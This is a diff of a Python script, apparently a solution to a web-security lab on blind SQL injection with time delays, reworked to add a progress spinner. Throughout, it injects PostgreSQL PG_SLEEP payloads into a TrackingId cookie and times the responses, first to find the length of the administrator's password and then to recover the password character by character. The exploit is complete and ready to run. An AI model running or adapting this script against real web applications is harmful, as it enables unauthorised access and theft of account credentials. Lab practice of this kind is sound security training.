@@ -1,94 +1,69 @@
 import requests
 import string
 import sys
-import os
 import getopt
 import urllib.parse
-
-
-def clear_screen():
-  if os.name == 'posix':
-    os.system('clear')
-  else:
-    os.system('cls')
+import threading
+from halo import Halo
 
 
 def get_password_length(url, trackingId, session):
-  password_length = 0
-  i = 0
+  password_length = 19
+  i = 19
 
   while True:
-    # If you get errors or false positives try incrementing the number 
-    # in the payload at "THEN PG_SLEEP(10)"
     payload = f"'; SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = {i}) THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
     payload = urllib.parse.quote_plus(payload)
-    cookies = {
-      "TrackingId": trackingId + payload,
-      "session": session
-      }
-    r = requests.get(url, cookies=cookies)
+    cookies = {"TrackingId": trackingId + payload, "session": session}
+    response = requests.get(url, cookies=cookies)
+    response_time = int(response.elapsed.total_seconds())
 
-    if int(r.elapsed.total_seconds()) < 5:
-      clear_screen()
-      print(f"[-] The password length is {password_length} characters long")
+    if response_time < 5:
       i += 1
       password_length += 1
     else:
-      clear_screen()
-      print(f"[*] The password length is {password_length} characters long")
-      break
-
-  return password_length
+     return password_length
 
 
 def get_password(password_length, url, trackingId, session):
+  spinner = Halo(spinner="bouncingBar")
   characters = string.ascii_lowercase + string.digits
   password = ""
-  message = "[-] The password for 'administrator' is: "
-  clear_screen()
-  print(message, end='', flush=True)
 
   for i in range(password_length):
+    spinner.start(f"Getting password: \"{password}\"")
+
     for x in characters:
-      # If you get errors or false positives try incrementing the number 
-      # in the payload at "THEN PG_SLEEP(10)"
-      payload = f"'; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, {i + 1}, 1) = '{x}') THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
+      payload = f"'; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, {i+1}, 1) = '{x}') THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
       payload = urllib.parse.quote_plus(payload)
-      cookies = {
-        "TrackingId":trackingId + payload,
-        "session":session
-        }
-      r = requests.get(url, cookies=cookies)
+      cookies = {"TrackingId": trackingId + payload, "session": session}
+      response = requests.get(url, cookies=cookies)
+      response_time = int(response.elapsed.total_seconds())
 
-      if int(r.elapsed.total_seconds()) >= 10:
+      if response_time >= 10:
         password += x
-        print(x, end='', flush=True)
         break
-  clear_screen()
 
-  return f"[*] The password for 'administrator' is: {password}"
-
+  return password
 
 def get_cookie(url):
   session = requests.Session()
-  if session.get(url).status_code != 200 :
-    sys.exit("[!] Error. Status code is not '200'")
-
   response = session.get(url)
   cookies = session.cookies.get_dict()
   values = list(cookies.values())
   trackingId = values[0]
   session = values[1]
-
   return trackingId, session 
 
 
 def main(argv):
+  help_message = "This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: python3 bsqli-4.py -u <url>"
+
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: python3 bsqli-4.py -u <url>")
-    print("\x1b[?25h")
+    print(help_message) 
+    print("\x1b[?25h", end="") # Make cursor visible 
     sys.exit(2)
 
   for opt, arg in opts:
@@ -96,18 +71,28 @@ def main(argv):
       url = arg
       trackingId, session = get_cookie(url)
     elif opt == "-h":
-      print("This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: python3 bsqli-4.py -u <url>")
-      print("\x1b[?25h")
+      print(help_message) 
+      print("\x1b[?25h", end="") # Make cursor visible 
       sys.exit()
+
+  # Create and start spinner animation
+  spinner = Halo(text="Getting password length...", spinner="bouncingBar")
+  spinner.start()
+  # Get password length
   password_length = get_password_length(url, trackingId, session)
+  # Finish spinner
+  spinner.succeed(f"The password length is: \"{password_length}\"")
+
+  # Create a spinner animation
+  spinner = Halo()
+  # Get valid password
   password = get_password(password_length, url, trackingId, session)
-  print(password)
+  # Finish spinner
+  spinner.succeed(f"The password is: \"{password}\"")
 
 
 if __name__ == "__main__":
-  # Hide Cursor
-  print("\x1b[?25l")
+  print("\x1b[?25l", end="") # Hide cursor
   main(sys.argv[1:])
-  # Make cursor visible
-  print("\x1b[?25h")
+  print("\x1b[?25h", end="") # Make cursor visible
   sys.exit()
